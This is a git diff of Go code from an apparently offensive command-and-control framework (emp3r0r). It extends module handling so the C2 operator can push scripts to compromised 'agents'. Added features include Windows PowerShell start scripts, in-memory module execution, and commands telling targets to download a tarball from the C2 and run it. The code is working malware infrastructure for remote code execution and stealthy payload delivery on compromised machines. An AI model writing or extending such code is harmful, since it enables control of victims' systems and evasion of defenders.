@@ -3,7 +3,6 @@
 
 package cc
 
-
 import (
 	"encoding/json"
 	"fmt"
@@ -38,6 +37,7 @@ import (
 type ModConfig struct {
 	Name          string `json:"name"`        // Display as this name
 	Exec          string `json:"exec"`        // Run this executable file
+	InMemory      bool   `json:"in_memory"`   // run this module in memory (for now ps1 is supported)
 	Platform      string `json:"platform"`    // targeting which OS? Linux/Windows
 	IsInteractive bool   `json:"interactive"` // whether run as a shell or not, eg. python, bettercap
 	Author        string `json:"author"`      // by whom
@@ -60,7 +60,12 @@ var ModuleNames = []string{}
 // moduleCustom run a custom module
 func moduleCustom() {
 	go func() {
-		start_sh := WWWRoot + CurrentMod + ".sh"
+		start_script := WWWRoot + CurrentMod + ".sh"
+		if CurrentTarget.GOOS == "windows" {
+			start_script = WWWRoot + CurrentMod + ".ps1"
+		}
+
+		// get module config
 		config, exists := ModuleConfigs[CurrentMod]
 		if !exists {
 			CliPrintError("Config of %s does not exist", CurrentMod)
@@ -70,38 +75,51 @@ func moduleCustom() {
 			val[0] = Options[opt].Val
 		}
 
-		// most of the time, start.sh is the only file changing
+		// most of the time, start script is the only file changing
 		// and it's very small, so we host it for agents to download
-		err = genStartScript(&config, start_sh)
+		err = genStartScript(&config, start_script)
 		if err != nil {
-			CliPrintError("Generating start.sh: %v", err)
+			CliPrintError("Generating start script: %v", err)
 			return
 		}
 		if config.IsInteractive {
-			// empty out start.sh
+			// empty out start script
 			// we will run the module as shell
-			err = os.WriteFile(start_sh, []byte("echo emp3r0r-interactive-module\n"), 0600)
+			err = os.WriteFile(start_script, []byte("echo emp3r0r-interactive-module\n"), 0o600)
 			if err != nil {
-				CliPrintError("write %s: %v", start_sh, err)
+				CliPrintError("write %s: %v", start_script, err)
 				return
 			}
 		}
 
-		// compress module files
-		tarball := WWWRoot + CurrentMod + ".tar.xz"
-		CliPrintInfo("Compressing %s with xz...", CurrentMod)
-		path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
-		err = util.TarXZ(path, tarball)
-		if err != nil {
-			CliPrintError("Compressing %s: %v", CurrentMod, err)
+		// in-memory module
+		if config.InMemory {
+			cmd := fmt.Sprintf("%s --mod %s --in_mem", emp3r0r_data.C2CmdCustomModule, CurrentMod)
+			cmd_id := uuid.NewString()
+			err = SendCmdToCurrentTarget(cmd, cmd_id)
+			if err != nil {
+				CliPrintError("Sending command %s to %s: %v", cmd, CurrentTarget.Tag, err)
+			}
 			return
 		}
-		CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
-			float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)
+
+		// compress module files
+		tarball := WWWRoot + CurrentMod + ".tar.xz"
+		if !util.IsFileExist(tarball) {
+			CliPrintInfo("Compressing %s with xz...", CurrentMod)
+			path := fmt.Sprintf("%s/%s", config.Path, CurrentMod)
+			err = util.TarXZ(path, tarball)
+			if err != nil {
+				CliPrintError("Compressing %s: %v", CurrentMod, err)
+				return
+			}
+			CliPrintInfo("Created %.4fMB archive (%s) for module '%s'",
+				float64(util.FileSize(tarball))/1024/1024, tarball, CurrentMod)
+		}
 
 		// tell agent to download and execute this module
 		checksum := tun.SHA256SumFile(tarball)
-		cmd := fmt.Sprintf("%s %s %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
+		cmd := fmt.Sprintf("%s --mod_name %s --checksum %s", emp3r0r_data.C2CmdCustomModule, CurrentMod, checksum)
 		cmd_id := uuid.NewString()
 		err = SendCmdToCurrentTarget(cmd, cmd_id)
 		if err != nil {
@@ -130,11 +148,11 @@ func moduleCustom() {
 			}
 
 			// do it
-			err := SSHClient(fmt.Sprintf("%s/%s/%s",
+			sshErr := SSHClient(fmt.Sprintf("%s/%s/%s",
 				RuntimeConfig.AgentRoot, CurrentMod, config.Exec),
 				args, port, false)
-			if err != nil {
-				CliPrintError("module %s: %v", config.Name, err)
+			if sshErr != nil {
+				CliPrintError("module %s: %v", config.Name, sshErr)
 				return
 			}
 		}
@@ -186,7 +204,7 @@ func ModuleDetails(modName string) {
 // and update ModuleHelpers, ModuleDocs
 func InitModules() {
 	if !util.IsExist(WWWRoot) {
-		os.MkdirAll(WWWRoot, 0700)
+		os.MkdirAll(WWWRoot, 0o700)
 	}
 
 	// get vaccine ready
@@ -203,9 +221,9 @@ func InitModules() {
 			return
 		}
 		CliPrintInfo("Scanning %s for modules", mod_dir)
-		dirs, err := os.ReadDir(mod_dir)
-		if err != nil {
-			CliPrintError("Failed to scan custom modules: %v", err)
+		dirs, readdirErr := os.ReadDir(mod_dir)
+		if readdirErr != nil {
+			CliPrintError("Failed to scan custom modules: %v", readdirErr)
 			return
 		}
 		for _, dir := range dirs {
@@ -216,9 +234,9 @@ func InitModules() {
 			if !util.IsExist(config_file) {
 				continue
 			}
-			config, err := readModCondig(config_file)
-			if err != nil {
-				CliPrintWarning("Reading config from %s: %v", dir.Name(), err)
+			config, readConfigErr := readModCondig(config_file)
+			if readConfigErr != nil {
+				CliPrintWarning("Reading config from %s: %v", dir.Name(), readConfigErr)
 				continue
 			}
 
@@ -228,9 +246,9 @@ func InitModules() {
 			ModuleHelpers[config.Name] = moduleCustom
 			emp3r0r_data.ModuleComments[config.Name] = config.Comment
 
-			err = updateModuleHelp(config)
-			if err != nil {
-				CliPrintWarning("Loading config from %s: %v", config.Name, err)
+			readConfigErr = updateModuleHelp(config)
+			if readConfigErr != nil {
+				CliPrintWarning("Loading config from %s: %v", config.Name, readConfigErr)
 				continue
 			}
 			ModuleConfigs[config.Name] = *config
@@ -241,7 +259,6 @@ func InitModules() {
 		for name, comment := range emp3r0r_data.ModuleComments {
 			ModuleNames = append(ModuleNames, fmt.Sprintf("%s: %s", color.HiBlueString(name), comment))
 		}
-
 	}
 
 	// read from every defined module dir
@@ -261,7 +278,7 @@ func readModCondig(file string) (pconfig *ModConfig, err error) {
 	}
 
 	// parse the json
-	var config = ModConfig{}
+	config := ModConfig{}
 	err = json.Unmarshal(jsonData, &config)
 	if err != nil {
 		return nil, fmt.Errorf("failed to unmarshal JSON config: %v", err)
@@ -270,16 +287,43 @@ func readModCondig(file string) (pconfig *ModConfig, err error) {
 	return
 }
 
-// genStartScript read config.json of a module
-func genStartScript(config *ModConfig, outfile string) (err error) {
-	data := ""
-	for opt, val_help := range config.Options {
-		data = fmt.Sprintf("%s %s='%s' ", data, opt, val_help[0])
-	}
-	data = fmt.Sprintf("%s ./%s ", data, config.Exec) // run with environment vars
+// genStartScript reads config.json of a module and generates a start script to invoke the module
+func genStartScript(config *ModConfig, outfile string) error {
+	module_exec_path := fmt.Sprintf("%s/%s/%s", config.Path, config.Name, config.Exec)
+	var builder strings.Builder
 
-	// write config.json
-	return os.WriteFile(outfile, []byte(data), 0600)
+	setEnvVar := func(opt, value string) {
+		if CurrentTarget.GOOS == "windows" {
+			fmt.Fprintf(&builder, "$env:%s='%s' ", opt, value)
+		} else {
+			fmt.Fprintf(&builder, "%s='%s' ", opt, value)
+		}
+	}
+
+	for opt, val_help := range config.Options {
+		setEnvVar(opt, val_help[0])
+	}
+
+	// Append execution command
+	if CurrentTarget.GOOS == "windows" {
+		// when it's not a powershell script, just run it
+		if !strings.HasSuffix(config.Exec, ".ps1") {
+			builder.WriteString(fmt.Sprintf("\n.\\%s", config.Exec))
+		}
+		// else we will append the script to start.ps1
+		mod_data, readErr := os.ReadFile(module_exec_path)
+		if readErr != nil {
+			return readErr
+		}
+		builder.WriteString(fmt.Sprintf("\n%s", mod_data))
+	} else {
+		builder.WriteString(fmt.Sprintf(" ./%s", config.Exec))
+	}
+	defer builder.Reset()
+	_ = os.WriteFile(outfile+".orig", []byte(builder.String()), 0o600)
+
+	// write to file
+	return os.WriteFile(outfile, []byte(builder.String()), 0o600)
 }
 
 func updateModuleHelp(config *ModConfig) error {
